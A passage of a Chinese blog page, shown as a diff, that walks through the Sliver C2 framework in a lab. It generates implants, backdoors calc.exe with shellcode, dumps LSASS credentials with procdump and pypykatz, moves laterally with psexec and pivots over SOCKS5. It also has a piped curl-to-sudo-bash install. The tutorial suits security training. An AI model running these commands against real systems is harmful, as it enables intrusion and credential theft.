@@ -1,0 +1,780 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="sliver简介sliver C2Sliver 是一个开源的跨平台红队框架，各种规模的组织都可以使用它来进行安全测试。Sliver 的implant支持 Mutual TLS (mTLS)、WireGuard、HTTP(S) 和 DNS上的C2，并使用每个二进制非对称加密密钥进行动态编译。服务器和客户端支持 MacOS、Windows 和Linux。 sliver提供了两种操作模式：  Beaco">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sliver教程">
+<meta property="og:url" content="http://example.com/2024/07/23/sliver/index.html">
+<meta property="og:site_name" content="Ry4nnnn">
+<meta property="og:description" content="sliver简介sliver C2Sliver 是一个开源的跨平台红队框架，各种规模的组织都可以使用它来进行安全测试。Sliver 的implant支持 Mutual TLS (mTLS)、WireGuard、HTTP(S) 和 DNS上的C2，并使用每个二进制非对称加密密钥进行动态编译。服务器和客户端支持 MacOS、Windows 和Linux。 sliver提供了两种操作模式：  Beaco">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231019135425500.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231019144740087.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231019144907285.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231019145004511.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231019145142124.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231019145644064.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231019153239067.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231019151517292.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231019153915685.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231019154130731.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231019154832033.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231019155704545.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231019155729510.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024134027322.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024134041449.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231019180223957.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231019172900127.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231019172938523.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231019173027415.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231019173045704.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231023155817041.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231023155833561.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231023155944605.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231023160427453.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231023162852719.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231023162917736.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024160349034.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024160836657.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024160845782.png">
+<meta property="og:image" content="http://example.com/2024/07/23/sliver/sliver/image-20231024160947509.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024161138381.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231023165932394.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231023170029876.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231023170126512.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024104007096.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024104205839.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024104237238.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024104358433.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024104526738.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024110641052.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024110437329.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024110614526.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024110808468.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024141416340.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024140848147.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024141027254.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024142207735.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024150628911.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024150702740.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024150753598.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024150906277.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024150949990.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024151044199.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024151102965.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024152334775.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024152524748.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024155719870.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024155753056.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024160043320.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024160122995.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/-20231024131541328.png">
+<meta property="article:published_time" content="2024-07-23T11:50:00.000Z">
+<meta property="article:modified_time" content="2024-07-23T09:40:43.054Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="C2">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/04/27/file-upload/-20231019135425500.png">
+  
+  
+  <title>sliver教程 - Ry4nnnn</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.13","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"MgDyY5XEdtIKIZHTxzy3GBJV-gzGzoHsz","app_key":"P8Ab9EN1clJmhpYHpamFEiD9","server_url":"https://mgdyy5xe.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ry4nnnn&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/moon.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="sliver教程">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2024-07-23 19:50" pubdate>
+        2024年7月23日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.9k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      41 分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">sliver教程</h1>
+            
+            <div class="markdown-body">
+              <h1 id="sliver"><a href="#sliver" class="headerlink" title="sliver"></a>sliver</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="sliver-C2"><a href="#sliver-C2" class="headerlink" title="sliver C2"></a>sliver C2</h3><p>Sliver 是一个开源的跨平台红队框架，各种规模的组织都可以使用它来进行安全测试。Sliver 的implant支持 Mutual TLS (mTLS)、WireGuard、HTTP(S) 和 DNS上的C2，并使用每个二进制非对称加密密钥进行动态编译。服务器和客户端支持 MacOS、Windows 和Linux。</p>
+<p>sliver提供了两种操作模式：</p>
+<ul>
+<li>Beacon mode：异步通信，1min检查通信情况。</li>
+<li>Session mode：实时会话。</li>
+</ul>
+<h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p><img src="/2023/04/27/file-upload/-20231019135425500.png" srcset="/img/loading.gif" lazyload alt="image-20231019135425500"></p>
+<p>如图所示，主要由四个部分组成。</p>
+<ul>
+<li>Sliver C2 console：服务器控制台是主界面，通过 sliver-server 可执行文件启动，所有操作代码都在客户&#x2F;服务器控制台之间共享；服务器控制台通过一个gRPC接口与服务器进行通信。</li>
+<li>Sliver C2 server：Sliver C2 服务器是 sliver-server 可执行文件的一部分，管理内部数据库，启动和停止网络监听器。与服务器交互的主要接口是gRPC接口，所有的功能都是通过它实现的。</li>
+<li>Sliver C2 client console：客户端控制台是用于与Sliver C2服务器互动的主要用户界面。</li>
+<li>Sliver C2 implant： implant是在目标系统上运行的恶意代码（exe、ps1等）。</li>
+</ul>
+<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>Sliver分为server和client，server建议部署在linux上，直接从<a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver">Release v1.5.41 · BishopFox&#x2F;sliver (github.com)</a>下载对应版本即可。</p>
+<p>也可以使用脚本一键安装：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -q -o- https://sliver.sh/install | <span class="hljs-built_in">sudo</span> bash<br></code></pre></td></tr></table></figure>
+
+<p>Sliver有两个外部依赖的可选功能： MinGW和Metasploit。</p>
+<ol>
+<li>要启用DLL有效载荷，需要安装MinGW。</li>
+<li>要启用一些MSF集成功能，需要在服务器上安装Metasploit。</li>
+</ol>
+<p>配置文件根据系统不同放在如下位置：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">windows</span>=C:/Users/xxx/.sliver-client/configs/<br><span class="hljs-attr">linux</span>=~/.sliver-client/configs/<br></code></pre></td></tr></table></figure>
+
+<p>如果只有一个配置文件，直接运行client即可，否则需要先进行import。</p>
+<p>例如<code>./sliver-client-linux import /xxx.cfg</code></p>
+<p>server端默认监听的端口为31337，创建用户配置文件尽量修改默认值。</p>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">new-operator</span> <span class="hljs-built_in">--name</span> <span class="hljs-string">Jesen</span> <span class="hljs-built_in">--lport</span> <span class="hljs-string">20000</span> <span class="hljs-built_in">--lhost</span> <span class="hljs-string">1</span>.<span class="hljs-string">1</span>.<span class="hljs-string">1</span>.<span class="hljs-string">1</span> 	<span class="hljs-comment">#创建用户配置文件</span><br><span class="hljs-string">multiplayer</span> -<span class="hljs-string">l</span> <span class="hljs-string">20000</span> 										<span class="hljs-comment">#启用多用户</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Sliver使用"><a href="#Sliver使用" class="headerlink" title="Sliver使用"></a>Sliver使用</h2><h3 id="木马上线示例"><a href="#木马上线示例" class="headerlink" title="木马上线示例"></a>木马上线示例</h3><p>.&#x2F;sliver-server_linux启动服务端：</p>
+<p><img src="/2023/04/27/file-upload/-20231019144740087.png" srcset="/img/loading.gif" lazyload alt="image-20231019144740087"></p>
+<p>http -l 9001创建监听器：</p>
+<p><img src="/2023/04/27/file-upload/-20231019144907285.png" srcset="/img/loading.gif" lazyload alt="image-20231019144907285"></p>
+<p>generate –http <a target="_blank" rel="noopener" href="http://192.168.126.128:9001/">http://192.168.126.128:9001</a> –os windows 生成implant：</p>
+<p><img src="/2023/04/27/file-upload/-20231019145004511.png" srcset="/img/loading.gif" lazyload alt="image-20231019145004511"></p>
+<p>这里的url即为server的监听地址，平台选择为windows。</p>
+<p>在受害主机点击implant后，sliver提示连接成功：</p>
+<p><img src="/2023/04/27/file-upload/-20231019145142124.png" srcset="/img/loading.gif" lazyload alt="image-20231019145142124"></p>
+<p>输入shell命令，即可进入交互式shell执行命令（OPSEC是一个新的红队的攻击规范，提示是因为交互式shell会被记录到对方的历史记录中）：</p>
+<p><img src="/2023/04/27/file-upload/-20231019145644064.png" srcset="/img/loading.gif" lazyload alt="image-20231019145644064"></p>
+<h3 id="功能详细介绍"><a href="#功能详细介绍" class="headerlink" title="功能详细介绍"></a>功能详细介绍</h3><h4 id="implant"><a href="#implant" class="headerlink" title="implant"></a>implant</h4><p>这里implant跟payload含义类似，下面直接用命令演示：</p>
+<p><code>generate --mtls 192.168.126.128:443 --os windows --arch amd64</code></p>
+<p><img src="/2023/04/27/file-upload/-20231019153239067.png" srcset="/img/loading.gif" lazyload alt="image-20231019153239067"></p>
+<p>–mtls表示使用mtls协议，注意这里如果使用mtls，后面的监听地址不能加上http不然地址会变成mtls:&#x2F;&#x2F;http:xxx，–os选择平台，–arch代表架构。使用implant命令可以直接查看目前生成的所有implant。</p>
+<p>如果要重新生成，可以使用regenerate命令。</p>
+<h4 id="listener"><a href="#listener" class="headerlink" title="listener"></a>listener</h4><p>在接受回连shell之前，需要先设置好监听器，目前sliver支持下列协议的监听：</p>
+<ul>
+<li>mTLS 相互传输层安全（Mutual TLS）是一个建立加密TLS连接的过程，双方都使用X.509数字证书来验证对方。</li>
+<li>HTTP</li>
+<li>HTTPS</li>
+<li>DNS</li>
+<li>Wireguard</li>
+</ul>
+<p><img src="/2023/04/27/file-upload/-20231019151517292.png" srcset="/img/loading.gif" lazyload alt="image-20231019151517292"></p>
+<h4 id="sessions"><a href="#sessions" class="headerlink" title="sessions"></a>sessions</h4><p>当shell成功回连后，可以使用use命令选择进入：</p>
+<p><img src="/2023/04/27/file-upload/-20231019153915685.png" srcset="/img/loading.gif" lazyload alt="image-20231019153915685"></p>
+<p>也可以使用sessions命令：</p>
+<p><img src="/2023/04/27/file-upload/-20231019154130731.png" srcset="/img/loading.gif" lazyload alt="image-20231019154130731"></p>
+<p>这里可以看到所有会话，并且可以进行kill等操作。</p>
+<h4 id="beacons"><a href="#beacons" class="headerlink" title="beacons"></a>beacons</h4><p>在开头的时候提到，sliver支持两种操作模式，beacon和session，前面所用到的都是session，接下来介绍一下beacon。</p>
+<p>首先生成一个beacon：</p>
+<p><code>generate beacon --http http://192.168.126.128:9001 --os windows</code></p>
+<p><img src="/2023/04/27/file-upload/-20231019154832033.png" srcset="/img/loading.gif" lazyload alt="image-20231019154832033"></p>
+<p>回连后，可以使用beacons来查看所有beacon或者直接use来选择所有回连的shell。</p>
+<p>beacon默认会每分钟检查一次连接情况，可以进入beacon后info查看：</p>
+<p><img src="/2023/04/27/file-upload/-20231019155704545.png" srcset="/img/loading.gif" lazyload alt="image-20231019155704545"></p>
+<p>也可以通过beacons watch：</p>
+<p><img src="/2023/04/27/file-upload/-20231019155729510.png" srcset="/img/loading.gif" lazyload alt="image-20231019155729510"></p>
+<p>如果想要关闭一个beacon，可以通过beacons rm或者beacons prune来自动移除非存活会话，而非kill命令：</p>
+<p><img src="/2023/04/27/file-upload/-20231024134027322.png" srcset="/img/loading.gif" lazyload alt="image-20231024134027322"></p>
+<p><img src="/2023/04/27/file-upload/-20231024134041449.png" srcset="/img/loading.gif" lazyload alt="image-20231024134041449"></p>
+<h4 id="armory"><a href="#armory" class="headerlink" title="armory"></a>armory</h4><p>Armory是Sliver Alias and Extension软件包管理器，它允许你自动安装各种第三方工具，如BOF和.NET工具。工具的清单可以在 <a target="_blank" rel="noopener" href="https://github.com/sliverarmory/armory/blob/master/armory.json">Github</a> 上找到。<br>安装第三方工具命令如下：</p>
+<p><code>armory install rubeus</code></p>
+<p>首先更新一下索引：</p>
+<p><img src="/2023/04/27/file-upload/-20231019180223957.png" srcset="/img/loading.gif" lazyload alt="image-20231019180223957"></p>
+<p>接着安装需要的工具即可。</p>
+<h4 id="multiplayer"><a href="#multiplayer" class="headerlink" title="multiplayer"></a>multiplayer</h4><p>要开启多操作员模式，首先需要在server端生成客户端配置文件：</p>
+<p><code>new-operator --name ry4n_win --lhost 192.168.126.128 --lport 20000</code></p>
+<p><img src="/2023/04/27/file-upload/-20231019172900127.png" srcset="/img/loading.gif" lazyload alt="image-20231019172900127"></p>
+<p>server端开启对应端口：</p>
+<p><code>multiplayer -l 20000</code></p>
+<p><img src="/2023/04/27/file-upload/-20231019172938523.png" srcset="/img/loading.gif" lazyload alt="image-20231019172938523"></p>
+<p>默认端口为31337，这里设置为20000.</p>
+<p>在client端，首先导入配置文件：</p>
+<p><code>sliver-client_windows.exe import .\ry4n_win_192.168.126.128.cfg</code></p>
+<p><img src="/2023/04/27/file-upload/-20231019173027415.png" srcset="/img/loading.gif" lazyload alt="image-20231019173027415"></p>
+<p>成功连接：</p>
+<p><img src="/2023/04/27/file-upload/-20231019173045704.png" srcset="/img/loading.gif" lazyload alt="image-20231019173045704"></p>
+<h3 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h3><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><h5 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h5><p>use选择session后，通过shell命令进入交互式shell：</p>
+<p><img src="/2023/04/27/file-upload/-20231023155817041.png" srcset="/img/loading.gif" lazyload alt="image-20231023155817041"></p>
+<h5 id="execute命令"><a href="#execute命令" class="headerlink" title="execute命令"></a>execute命令</h5><p>execute -o 执行单条命令：</p>
+<p><img src="/2023/04/27/file-upload/-20231023155833561.png" srcset="/img/loading.gif" lazyload alt="image-20231023155833561"></p>
+<p>execute 这种方式不会在主机上留下日志，其本质是执行shell文件夹下的一个文件间接去执行命令，不是直接的命令执行。因此很多命令都会提示 no such file or directory 或者 file does not exist。</p>
+<p>即：在环境变量中的命令可以使用这种方式去执行，不在其中的就不可以。</p>
+<h5 id="runas命令"><a href="#runas命令" class="headerlink" title="runas命令"></a>runas命令</h5><p>runas命令需要结合-u,-P,-p参数，启动一个新的进程运行指定命令。</p>
+<p><img src="/2023/04/27/file-upload/-20231023155944605.png" srcset="/img/loading.gif" lazyload alt="image-20231023155944605"></p>
+<h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><h5 id="getsystem"><a href="#getsystem" class="headerlink" title="getsystem"></a>getsystem</h5><p>这里利用getsystem进行演示，最新版的win11提权失败。</p>
+<p><img src="/2023/04/27/file-upload/-20231023160427453.png" srcset="/img/loading.gif" lazyload alt="image-20231023160427453"></p>
+<h4 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h4><h5 id="migrate"><a href="#migrate" class="headerlink" title="migrate"></a>migrate</h5><p>在sliver中，进程迁移时会产生一个新的session。</p>
+<p>首先ps查看进程列表：</p>
+<p><img src="/2023/04/27/file-upload/-20231023162852719.png" srcset="/img/loading.gif" lazyload alt="image-20231023162852719"></p>
+<p>migrate -p进行进程迁移，这里选择11680：</p>
+<p><img src="/2023/04/27/file-upload/-20231023162917736.png" srcset="/img/loading.gif" lazyload alt="image-20231023162917736"></p>
+<p>可以看到，迁移之前，当前session的pid保持不变，但是use命令查看可用进程时，多了一个11680pid的新session。</p>
+<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><h5 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h5><p><img src="/2023/04/27/file-upload/-20231024160349034.png" srcset="/img/loading.gif" lazyload alt="image-20231024160349034"></p>
+<p>首先需要生成一个profile作为shellcode：</p>
+<p><code>profiles new --http http://192.168.126.128 --os windows --arch amd64 --format shellcode windows-shellcode</code></p>
+<p><img src="/2023/04/27/file-upload/-20231024160836657.png" srcset="/img/loading.gif" lazyload alt="image-20231024160836657"></p>
+<p><code>backdoor --profile windows-shellcode &quot;C:\Users\Ry4n\Desktop\calc.exe&quot;</code></p>
+<p><img src="/2023/04/27/file-upload/-20231024160845782.png" srcset="/img/loading.gif" lazyload alt="image-20231024160845782"></p>
+<p>注入成功后查看calc.exe:</p>
+<img src="sliver/image-20231024160947509.png" srcset="/img/loading.gif" lazyload alt="image-20231024160947509" style="zoom:50%;" />
+
+<p>大小为16.2m。运行后上线：</p>
+<p><img src="/2023/04/27/file-upload/-20231024161138381.png" srcset="/img/loading.gif" lazyload alt="image-20231024161138381"></p>
+<h4 id="凭据访问"><a href="#凭据访问" class="headerlink" title="凭据访问"></a>凭据访问</h4><h5 id="procdump"><a href="#procdump" class="headerlink" title="procdump"></a>procdump</h5><p>先通过ps找到lsass进程：</p>
+<p><img src="/2023/04/27/file-upload/-20231023165932394.png" srcset="/img/loading.gif" lazyload alt="image-20231023165932394"></p>
+<p>pid为1268。（这里需要权限为system）</p>
+<p>接下来使用procdump命令,-p表示target pid：</p>
+<p><code>procdump -p 1268</code>:</p>
+<p><img src="/2023/04/27/file-upload/-20231023170029876.png" srcset="/img/loading.gif" lazyload alt="image-20231023170029876"></p>
+<h5 id="pypykatz"><a href="#pypykatz" class="headerlink" title="pypykatz"></a>pypykatz</h5><p>接下来利用pypykatz进行解密：</p>
+<p><code>pypykatz lsa minidump lsass.dump</code>:</p>
+<p><img src="/2023/04/27/file-upload/-20231023170126512.png" srcset="/img/loading.gif" lazyload alt="image-20231023170126512"></p>
+<p>获得凭据信息。</p>
+<p>这里如果解密失败，出现报错<code>All detection methods failed</code>，是因为在新版windows中，LSASS 转储中 AES 和 TDES 密钥的正确签名和偏移量已经更改，将pypykatz更新到0.6.8之后版本即可。</p>
+<h4 id="网络探测"><a href="#网络探测" class="headerlink" title="网络探测"></a>网络探测</h4><p><code>execute -o powershell &quot;Get-NetNeighbor | Where-Object -Property State -NE &quot;Unreachable&quot; | Select-Object -Property IPAddress&quot;</code></p>
+<p><img src="/2023/04/27/file-upload/-20231024104007096.png" srcset="/img/loading.gif" lazyload alt="image-20231024104007096"></p>
+<h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><h5 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h5><p>-h查看相关命令：</p>
+<p><img src="/2023/04/27/file-upload/-20231024104205839.png" srcset="/img/loading.gif" lazyload alt="image-20231024104205839"></p>
+<p>首先生成配置文件：</p>
+<p><code>profiles new --format service --skip-symbols --mtls 192.168.126.128 win-svc64</code></p>
+<p><img src="/2023/04/27/file-upload/-20231024104237238.png" srcset="/img/loading.gif" lazyload alt="image-20231024104237238"></p>
+<p><code>psexec -s test_service -p win-svc64 192.168.126.1</code></p>
+<p><img src="/2023/04/27/file-upload/-20231024104358433.png" srcset="/img/loading.gif" lazyload alt="image-20231024104358433"></p>
+<p>这里只有单台机器的环境，仅作操作演示，执行后会在C:&#x2F;temp目录下上传一个随机命名的exe文件，并且开启一个名为test_service的服务：</p>
+<p><img src="/2023/04/27/file-upload/-20231024104526738.png" srcset="/img/loading.gif" lazyload alt="image-20231024104526738"></p>
+<h4 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h4><h5 id="socks5"><a href="#socks5" class="headerlink" title="socks5"></a>socks5</h5><p>不同于cs的代理在server端，Sliver的代理是开在<strong>本地客户端！！！</strong></p>
+<p>通过内置的socks命令，开启一个sock5代理：</p>
+<p><img src="/2023/04/27/file-upload/-20231024110641052.png" srcset="/img/loading.gif" lazyload alt="image-20231024110641052"></p>
+<p>失陷主机开启一个simple http服务模拟web服务，另一网段的机器访问受害主机，在未开启代理时无法访问：</p>
+<p><img src="/2023/04/27/file-upload/-20231024110437329.png" srcset="/img/loading.gif" lazyload alt="image-20231024110437329"></p>
+<p>在sliver server开启socks5代理后，通过socks5代理访问：</p>
+<p><img src="/2023/04/27/file-upload/-20231024110614526.png" srcset="/img/loading.gif" lazyload alt="image-20231024110614526"></p>
+<p>如果想终止代理，stop命令即可：</p>
+<p><img src="/2023/04/27/file-upload/-20231024110808468.png" srcset="/img/loading.gif" lazyload alt="image-20231024110808468"></p>
+<p>这里是将代理的ip设置为了server另一张网卡，通过与该网卡同一网段的机器进行内网的访问。</p>
+<p>下面直接启用一个客户端，在客户端开启127.0.0.1的本地代理进行访问。</p>
+<p>首先按照前面的步骤开启多操作员模式，并且运行client，开启socks5代理：</p>
